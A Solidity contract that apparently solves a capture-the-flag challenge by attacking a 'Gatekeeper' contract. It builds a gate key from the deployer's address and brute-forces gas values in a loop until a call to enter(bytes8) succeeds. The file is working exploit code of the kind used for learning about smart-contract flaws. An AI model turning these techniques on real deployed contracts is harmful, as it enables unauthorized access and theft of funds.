// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Gatekeeper} from "./Gatekeeper.sol";
import "hardhat/console.sol";

contract HackGatekeeper {
    Gatekeeper gatekeeper;
    bytes8 public _gateKey;

    constructor(address _gatekeeper) {
        gatekeeper = Gatekeeper(_gatekeeper);
        _gateKey = bytes8(uint64(uint16(uint160(msg.sender))) + 2 ** 63);
    }

    function hack() public {
        for (uint i; i < 120; ++i) {
            // 3 + 420 + 8191 *3 is the correct gas limit
            // 24996
            (bool sent, bytes memory data) = address(gatekeeper).call{
                gas: i + 420 + 8191 * 3
            }(abi.encodeWithSignature("enter(bytes8)", _gateKey));
            if (sent) return;
        }
    }
}
